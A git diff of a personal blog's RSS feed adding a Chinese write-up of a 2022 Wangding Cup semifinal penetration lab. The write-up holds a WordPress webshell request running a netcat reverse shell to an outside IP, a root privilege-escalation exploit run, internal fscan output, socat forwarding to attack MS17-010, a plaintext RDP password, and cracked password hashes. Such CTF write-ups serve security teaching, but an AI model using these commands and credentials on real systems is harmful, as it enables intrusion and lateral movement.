@@ -1,5 +1,131 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Sun, 20 Sep 2026 12:14:34 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>Exchange</title><link>https://faabbi.github.io/post/Exchange.html</link><description>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>MJ</title><link>https://faabbi.github.io</link><description>人生这么长，不一直学怎么行呢？</description><copyright>MJ</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://avatars.githubusercontent.com/u/99706997?v=4</url><title>avatar</title><link>https://faabbi.github.io</link></image><lastBuildDate>Mon, 21 Sep 2026 04:52:48 +0000</lastBuildDate><managingEditor>MJ</managingEditor><ttl>60</ttl><webMaster>MJ</webMaster><item><title>2022网鼎杯半决赛复盘</title><link>https://faabbi.github.io/post/2022-wang-ding-bei-ban-jue-sai-fu-pan.html</link><description>&lt;html&gt;
+&lt;body&gt;
+&lt;!--StartFragment--&gt;&lt;!-- obsidian --&gt;&lt;h1 data-heading='外网'&gt;外网&lt;/h1&gt;
+&lt;p&gt;很经典的wordpress后台getshell，插件直接写马就行，写的时候不要启用&lt;/p&gt;
+&lt;p&gt;disable_function&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;按理说直接system马就行，eval的话是语言解释器，不是函数，禁用情况不知道，但是system会500，最后用eval了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /wp-content/plugins/hello.php?cmd=system('busybox+nc+211.159.175.21+2332+-e+/bin/bash'); HTTP/1.1
+Host: 39.98.123.229
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: wordpress_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7Cf6bc54e8e97ef6879b25593606389ca8b682aaa3c160e39372168f5aa1fc81ba; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_af049f20670cc3c1b6e4eccb75914352=admin%7C1790130763%7CQjDrGJMg6m0XRsmFNxIgDvzxI6657La0lGjtKvYbvVQ%7C9d7ee18aba1e2df5c088c14ae624283eb02ffe28f59c85852af3bc43f6526f5b; wp_lang=en_US; wp-settings-time-1=1789958476
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;直接拿shell即可&lt;/p&gt;
+&lt;p&gt;我打的比较晚，直接copy-fail一把梭了，实际上也不需要提权&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;www-data@ubuntu-web:/tmp$ ls -al
+total 52
+drwxrwxrwt  2 root     root      4096 Sep 21 10:49 .
+drwxr-xr-x 18 root     root      4096 Sep 21 10:30 ..
+-rwxr-xr-x  1 www-data www-data  9800 Sep 21 10:48 22b008b7tcp
+-rwxr-xr-x  1 www-data www-data 29728 Sep 21 10:49 copy-fail-c-x86_64-musl
+www-data@ubuntu-web:/tmp$ ./copy-fail-c-x86_64-musl
+[+] target:    /usr/bin/su
+[+] payload:   1728 bytes (432 iterations)
+[+] page cache mutated; exec'ing target
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;写个公钥即可&lt;/p&gt;
+&lt;h1 data-heading='内网'&gt;内网&lt;/h1&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;root@ubuntu-web:~# fscan -h 172.22.15.26/24
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &amp;#x3C;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.22.15.26    is alive
+(icmp) Target 172.22.15.18    is alive
+(icmp) Target 172.22.15.13    is alive
+(icmp) Target 172.22.15.24    is alive
+(icmp) Target 172.22.15.35    is alive
+[*] Icmp alive hosts len is: 5
+172.22.15.24:80 open
+172.22.15.18:80 open
+172.22.15.26:80 open
+172.22.15.26:22 open
+172.22.15.13:135 open
+172.22.15.18:139 open
+172.22.15.35:135 open
+172.22.15.24:135 open
+172.22.15.18:135 open
+172.22.15.13:88 open
+172.22.15.24:3306 open
+172.22.15.35:445 open
+172.22.15.24:445 open
+172.22.15.13:445 open
+172.22.15.18:445 open
+172.22.15.35:139 open
+172.22.15.24:139 open
+172.22.15.13:139 open
+[*] alive ports len is: 18
+start vulscan
+[*] NetInfo
+[*]172.22.15.18
+   [-&gt;]XR-CA
+   [-&gt;]172.22.15.18
+[*] NetInfo
+[*]172.22.15.24
+   [-&gt;]XR-WIN08
+   [-&gt;]172.22.15.24
+[*] NetInfo
+[*]172.22.15.35
+   [-&gt;]XR-0687
+   [-&gt;]172.22.15.35
+[*] NetInfo
+[*]172.22.15.13
+   [-&gt;]XR-DC01
+   [-&gt;]172.22.15.13
+[*] OsInfo 172.22.15.13 (Windows Server 2016 Standard 14393)
+[*] NetBios 172.22.15.35    XIAORANG\XR-0687
+[*] NetBios 172.22.15.13    [+] DC:XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393
+[*] NetBios 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393
+[+] MS17-010 172.22.15.24       (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
+[*] NetBios 172.22.15.24    WORKGROUP\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1
+[*] WebTitle http://172.22.15.26       code:200 len:39966  title:XIAORANG.LAB
+[*] WebTitle http://172.22.15.18       code:200 len:703    title:IIS Windows Server
+[*] WebTitle http://172.22.15.24       code:302 len:0      title:None 跳转url: http://172.22.15.24/www
+[+] PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect
+[*] WebTitle http://172.22.15.24/www/sys/index.php code:200 len:135    title:None
+已完成 18/18
+&lt;/code&gt;&lt;/pre&gt;
+
+IP | NetInfo | NetBios/主机名 | 系统 | 开放端口 | WebTitle | 漏洞/检测
+-- | -- | -- | -- | -- | -- | --
+172.22.15.13 | XR-DC01 | DC:XR-DC01.xiaorang.lab | Windows Server 2016 Standard 14393 | 88,135,139,445 | - | -
+172.22.15.18 | XR-CA | XR-CA.xiaorang.lab | Windows Server 2016 Standard 14393 | 80,135,139,445 | http://172.22.15.18 code:200 len:703 title:IIS Windows Server | PocScan http://172.22.15.18 poc-yaml-active-directory-certsrv-detect
+172.22.15.24 | XR-WIN08 | WORKGROUP\XR-WIN08 | Windows Server 2008 R2 Enterprise 7601 Service Pack 1 | 80,135,139,445,3306 | http://172.22.15.24 code:302 len:0 title:None 跳转url: http://172.22.15.24/www  http://172.22.15.24/www/sys/index.php code:200 len:135 title:None | MS17-010
+172.22.15.35 | XR-0687 | XIAORANG\XR-0687 | - | 135,139,445 | - | -
+
+
+&lt;p&gt;18是证书服务，24有永恒之蓝，把24 445转出来打，msf走代理全是问题&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;root@ubuntu-web:/# socat TCP-LISTEN:10086,reuseaddr,fork TCP4:172.22.15.24:445 &amp;#x26;
+[1] 2581
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;img width='1536' height='1176' alt='Image' src='https://github.com/user-attachments/assets/8fbff877-9998-46d2-b4ad-4b753283eda1' /&gt;
+
+&lt;p&gt;直接秒了就行，机器不在域内，价值也不是很大，可以上去抓一下hash看看，不过没有价值信息，打CA得要个域用户，可以去看数据库配置文件在C:\phpstudy_pro\WWW\config\my.php&lt;/p&gt;
+&lt;pre&gt;&lt;code class='language-bash'&gt;┌──(root㉿MJ)-[/tmp/test/yunjing]
+└─# pc xfreerdp3 /v:172.22.15.24 /u:admin01 /p:'Config123!@#' /drive:share,/tmp/test/yunjing/dc /cert:ignore /sec:nla /tls:seclevel:0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;9ed9d2a1640b54c6eb9581ce334b79ab:wangwei
+cbdb423c741fcea593f0e522fdd417b0:wangfang
+c7122a1349c22cb3c009da3613d242ab:123456
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;也就这三个，这里我尝试smb撞域内机器都上不去，其实是&lt;strong&gt;AS-REP Roasting&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;禁用了 Kerberos 预认证&lt;/strong&gt;（&lt;code&gt;DONT_REQ_PREAUTH&lt;/code&gt;）的账户。</description><guid isPermaLink="true">https://faabbi.github.io/post/2022-wang-ding-bei-ban-jue-sai-fu-pan.html</guid><pubDate>Mon, 21 Sep 2026 04:52:18 +0000</pubDate></item><item><title>Exchange</title><link>https://faabbi.github.io/post/Exchange.html</link><description>
 # 外网
 
 ```bash
